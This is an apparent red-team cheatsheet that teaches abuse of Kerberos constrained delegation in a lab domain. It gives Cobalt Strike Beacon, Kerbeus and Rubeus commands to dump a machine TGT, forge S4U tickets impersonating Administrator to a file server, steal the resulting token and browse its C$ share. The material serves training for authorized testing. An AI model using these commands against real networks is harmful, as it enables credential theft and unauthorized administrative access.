---
title: "Kerberos Constrained Delegation"
description: "Enumerate msDS-AllowedToDelegateTo, distinguish protocol transition from Kerberos-only delegation, and request and use a service ticket with Rubeus or Kerbeus."
category: "Kerberos"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "PowerShell"]
updated: 2026-11-15
tags: ["kerberos", "delegation", "s4u", "constrained-delegation"]
draft: false
---

## 1. Why the attack works

Classic constrained delegation places a list of permitted back-end SPNs in the **front-end account's** `msDS-AllowedToDelegateTo`. Controlling that front-end identity can allow an attacker to obtain a service ticket to one of those back ends as another user.

S4U2self requests a ticket for a user **to the requesting service itself**. S4U2proxy uses an evidence ticket to request access **to a back-end service**. These are different steps; neither requires recovery of the impersonated user's password.

| Mode | Material required in this lab | Request |
|---|---|---|
| With protocol transition | Front-end TGT and an eligible user identity | S4U2self followed by S4U2proxy |
| Kerberos-only | Front-end TGT plus a suitable forwardable user service ticket to the front end | S4U2proxy using the captured evidence ticket |

`TRUSTED_TO_AUTH_FOR_DELEGATION` is UAC bit `16777216`. It enables the protocol-transition path in this example; it does not bypass account restrictions such as Protected Users or “sensitive and cannot be delegated.” A successful service ticket also does not override the back end's authorization checks.

## 2. Enumerate delegation and check the flag

```shell
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
# Lab: LON-WS-1$ -> cifs/lon-fs-1, UAC 16781312
```

The filter selects computers; user service accounts can also hold this attribute. Check the actual SPN, including whether it is a short name or FQDN.

```powershell
[Convert]::ToBoolean(16781312 -band 16777216)
# True: protocol transition is enabled in the lab example.
```

## 3. Obtain the front-end TGT

From an elevated Beacon on `lon-ws-1`, inspect the machine's SYSTEM logon session. `0x3e7` identifies that session; verify that the returned ticket belongs to `LON-WS-1$`.

```shell
beacon> krb_dump /luid:3e7 /service:krbtgt
# Alternative:
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

## 4. With protocol transition

Choose the BOF or Rubeus version; both examples target the same delegated SPN.

```shell
beacon> krb_s4u /ticket:<FRONTEND_TGT_BASE64> /service:cifs/lon-fs-1 /impersonateuser:Administrator

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<FRONTEND_TGT_BASE64> /impersonateuser:Administrator /nowrap
# Expected stages: S4U2self, then S4U2proxy.
# Keep the final Administrator -> cifs/lon-fs-1 ticket.
```

## 5. Without protocol transition

The lab notes use an existing `dyork -> HTTP/lon-ws-1` service ticket. A TGT for the user is not a substitute for this front-end evidence ticket, and the front-end TGT alone is insufficient for this path.

```shell
beacon> krb_triage
beacon> krb_dump /user:dyork /service:HTTP
# Verify that the selected service ticket is for HTTP/lon-ws-1 and is suitable for delegation.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<FRONTEND_TGT_BASE64> /tgs:<DYORK_FRONTEND_TICKET_BASE64> /nowrap
# Keep the final dyork -> cifs/lon-fs-1 ticket.
```

For the next section, use `dyork` as the session label instead of `Administrator` when following this second path. The ticket's actual client identity determines authentication.

## Use the resulting service ticket

Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
# Record ProcessID and verify that ticket import succeeded.
beacon> steal_token <PID>
beacon> run klist
# Client: Administrator @ CONTOSO.COM
# Server: cifs/lon-fs-1 @ CONTOSO.COM
beacon> ls \\lon-fs-1\c$
```

A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.

## Session cleanup

Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.

```shell
beacon> kerberos_ticket_purge
beacon> rev2self
beacon> kill <PID>
```

## Troubleshooting

| Symptom | Check |
|---|---|
| `KDC_ERR_BADOPTION` | Evidence ticket, forwardability, delegation restrictions and permitted SPN |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Exact SPN registration, account and realm |
| CIFS ticket issued but access denied | User's permissions, destination hostname and active logon session |
| Only a front-end ticket returned | Identify whether S4U2proxy actually succeeded |

## Related references

- [Service name substitution](/cheatsheets/kerberos-service-name-substitution-cheatsheet/)
- [Resource-based constrained delegation](/cheatsheets/kerberos-rbcd-cheatsheet/)
- [Rubeus S4U examples](https://github.com/GhostPack/Rubeus#s4u)
- [Microsoft: constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
